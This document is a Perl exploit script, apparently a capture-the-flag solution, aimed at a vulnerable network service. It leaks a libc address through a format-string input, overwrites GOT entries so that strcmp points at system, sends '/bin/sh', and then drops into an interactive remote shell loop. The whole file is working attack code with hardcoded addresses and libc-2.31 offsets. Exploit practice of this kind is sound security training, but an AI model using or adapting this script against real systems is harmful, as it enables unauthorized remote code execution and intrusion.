#!/usr/bin/perl

use strict;
use warnings;

use IO::Socket;
use MIME::Base64;

if (@ARGV != 2) {
	use File::Basename;
	my $name = basename($0, "");
	die "Usage: perl $name host port\n";
}

my $sock = new IO::Socket::INET(PeerAddr=>$ARGV[0], PeerPort=>int($ARGV[1]), Proto=>"tcp");
unless ($sock) { die "connection failed: $!\n"; }
binmode($sock);

# disable buffering for socket

select $sock;
$| = 1;
select STDOUT;

# informatin about chall

my $printf_plt = 0x401070;
my $alarm_plt = 0x401080;
my $read_plt = 0x401090;

my $puts_got = 0x4036c0;

my $init_after_prologue = 0x40127b;
my $parser_after_first_printf = 0x4014cd;
my $main_parser_textarea_0 = 0x4017dc;
my $main_last_for = 0x4018f9;
my $main_last_for_after_printf = 0x40193d;
my $ret = 0x401992;

# information about libc-2.31.so

my $main_ret_libc = 0x270b3;
my $system_libc = 0x55410;

# 1st phase

my $payload_allow_write_got = ("#" x 0x30) . pack("Q", $puts_got);
my $payload_1st = pack("QQQQQQQQ",
	$init_after_prologue,        # puts
	$ret,                        # __stack_chk_fail
	$main_last_for,              # setbuf
	$alarm_plt,                  # printf
	$main_parser_textarea_0,     # alarm
	$read_plt,                   # read
	$printf_plt,                 # strcmp
	$main_last_for_after_printf, # malloc
);

print $sock "!!!!%23\$p!!!!\n\0";
sleep 1;
print $sock "2";
sleep 1;
print $sock "3";
sleep 1;
print $sock $payload_allow_write_got;
sleep 1;
print $sock "5";
sleep 1;
print $sock $payload_1st;

my $main_ret_mem = 0;
for (;;) {
	my $line = <$sock>;
	unless ($line) {
		close($sock);
		die "connection failed...\n";
	}
	if ($line =~ /!!!!(0x)?([0-9a-fA-F]+)!!!!/) {
		$main_ret_mem = hex($2);
		last;
	}
}

printf "main_ret_mem = 0x%x\n", $main_ret_mem;

# 2nd phase

my $system_mem = $main_ret_mem + $system_libc - $main_ret_libc;

my $payload_2nd = pack("QQQQQQQQ",
	$main_parser_textarea_0,     # puts
	$ret,                        # __stack_chk_fail
	$ret,                        # setbuf
	$parser_after_first_printf,  # printf
	$ret,                        # alarm
	$read_plt,                   # read
	$system_mem,                 # strcmp
	$main_last_for_after_printf, # malloc
);

print $sock "/bin/sh\0";
sleep 1;
print $sock "1";
sleep 1;
print $sock "2";
sleep 1;
print $sock "3";
sleep 1;
print $sock "4";
sleep 1;
print $sock $payload_2nd;

# shell

print $sock "echo meow\n";

for (;;) {
	my $line = <$sock>;
	print $line;
	unless ($line) {
		print "connection error...\n";
		close($sock);
		exit 1;
	}
	chomp($line);
	if ($line =~ /meow\z/) {
		print "entering pseudo-interactive mode!\n";
		last;
	}
}

while (my $command = <STDIN>) {
	chomp($command);
	if ($command eq "") {
		# do nothing
	} elsif ($command eq "exit") {
		print $sock "exit\n";
		last;
	} else {
		print $sock "$command | base64 -w 999999999\n";
		my $resp = <$sock>;
		print decode_base64($resp);
	}
}

close($sock);
